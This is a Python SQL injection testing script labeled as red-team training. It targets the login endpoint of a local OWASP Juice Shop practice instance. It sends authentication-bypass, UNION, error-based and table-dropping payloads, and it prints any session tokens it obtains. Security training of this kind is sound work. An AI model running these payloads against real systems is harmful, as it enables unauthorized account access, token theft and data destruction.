#!/usr/bin/env python3
"""
Day 3 - SQL Injection 테스트
Target: Juice Shop Login Page
Author: Red Team Training
"""
import requests
import json
from datetime import datetime

class SQLInjectionTester:
    def __init__(self):
        self.base_url = "http://localhost:3000"
        self.login_url = f"{self.base_url}/rest/user/login"
        self.results = []
        
    def print_banner(self):
        print("""
╔════════════════════════════════════════════════╗
║     🎯 SQL Injection Testing Tool v1.0        ║
║     Target: Juice Shop                        ║
╚════════════════════════════════════════════════╝
        """)
    
    def test_basic_sqli(self):
        """기본 SQL Injection 테스트"""
        print("\n[1] 🔍 기본 SQL Injection 페이로드 테스트")
        print("=" * 60)
        
        payloads = [
            ("' OR '1'='1", "Classic OR bypass"),
            ("admin'--", "Comment bypass"),
            ("' OR 1=1--", "Numeric OR bypass"),
            ("admin' OR '1'='1'--", "Admin bypass with OR"),
            ("' OR 'a'='a", "String comparison bypass"),
        ]
        
        for payload, description in payloads:
            print(f"\n📝 테스트: {description}")
            print(f"🎯 페이로드: {payload}")
            
            data = {
                "email": payload,
                "password": "anything"
            }
            
            try:
                response = requests.post(
                    self.login_url, 
                    json=data,
                    headers={"Content-Type": "application/json"}
                )
                
                status = response.status_code
                result = {
                    "payload": payload,
                    "description": description,
                    "status_code": status,
                    "success": status == 200,
                    "response_preview": response.text[:200]
                }
                
                self.results.append(result)
                
                if status == 200:
                    print(f"✅ 성공! (상태: {status})")
                    print(f"📦 응답: {response.text[:150]}...")
                    
                    # Token 확인
                    try:
                        json_response = response.json()
                        if 'authentication' in json_response:
                            print(f"🔑 토큰 획득: {json_response['authentication']['token'][:30]}...")
                    except:
                        pass
                else:
                    print(f"❌ 실패 (상태: {status})")
                    
            except Exception as e:
                print(f"⚠️  에러: {e}")
            
            print("-" * 60)
    
    def test_admin_bypass(self):
        """관리자 계정 우회 시도"""
        print("\n[2] 👑 관리자 계정 우회 테스트")
        print("=" * 60)
        
        admin_payloads = [
            "admin@juice-sh.op'--",
            "administrator'--",
            "admin' OR '1'='1'--",
            "' OR email LIKE '%admin%'--",
        ]
        
        for payload in admin_payloads:
            print(f"\n🎯 시도: {payload}")
            
            data = {
                "email": payload,
                "password": "dummy"
            }
            
            try:
                response = requests.post(self.login_url, json=data)
                
                if response.status_code == 200:
                    print("✅ 우회 성공!")
                    try:
                        result = response.json()
                        print(f"📧 사용자: {result.get('authentication', {}).get('umail', 'N/A')}")
                        print(f"🔑 토큰: {result.get('authentication', {}).get('token', 'N/A')[:40]}...")
                    except:
                        pass
                else:
                    print(f"❌ 실패 ({response.status_code})")
                    
            except Exception as e:
                print(f"⚠️  에러: {e}")
    
    def test_error_based_sqli(self):
        """에러 기반 SQL Injection"""
        print("\n[3] 💥 에러 기반 SQL Injection 테스트")
        print("=" * 60)
        
        error_payloads = [
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "'; DROP TABLE users--",  # 실제로 실행되진 않음
        ]
        
        for payload in error_payloads:
            print(f"\n🎯 페이로드: {payload}")
            
            data = {"email": payload, "password": "test"}
            
            try:
                response = requests.post(self.login_url, json=data)
                print(f"📊 상태: {response.status_code}")
                
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print("🔍 SQL 에러 감지! (취약점 확인)")
                    print(f"📄 에러: {response.text[:200]}")
                else:
                    print("ℹ️  일반 응답")
                    
            except Exception as e:
                print(f"⚠️  에러: {e}")
    
    def generate_report(self):
        """결과 보고서 생성"""
        print("\n" + "=" * 60)
        print("📊 SQL Injection 테스트 결과 요약")
        print("=" * 60)
        
        successful = sum(1 for r in self.results if r['success'])
        total = len(self.results)
        
        print(f"\n✅ 성공: {successful}/{total}")
        print(f"❌ 실패: {total - successful}/{total}")
        
        if successful > 0:
            print("\n⚠️  취약점 발견!")
            print("권고사항:")
            print("  1. Prepared Statements 사용")
            print("  2. 입력값 검증 강화")
            print("  3. 최소 권한 원칙 적용")
            print("  4. 에러 메시지 노출 차단")
        
        # 파일 저장
        report_file = f"sql_injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write("SQL Injection Test Report\n")
            f.write("=" * 60 + "\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"Target: {self.base_url}\n\n")
            
            for idx, result in enumerate(self.results, 1):
                f.write(f"\n[Test {idx}]\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Description: {result['description']}\n")
                f.write(f"Status: {result['status_code']}\n")
                f.write(f"Success: {result['success']}\n")
                f.write("-" * 60 + "\n")
        
        print(f"\n💾 보고서 저장: {report_file}")

def main():
    tester = SQLInjectionTester()
    tester.print_banner()
    
    print("🚀 테스트 시작...\n")
    
    # 테스트 실행
    tester.test_basic_sqli()
    tester.test_admin_bypass()
    tester.test_error_based_sqli()
    
    # 보고서 생성
    tester.generate_report()
    
    print("\n✅ 모든 테스트 완료!")
    print("=" * 60)

if __name__ == "__main__":
    main()
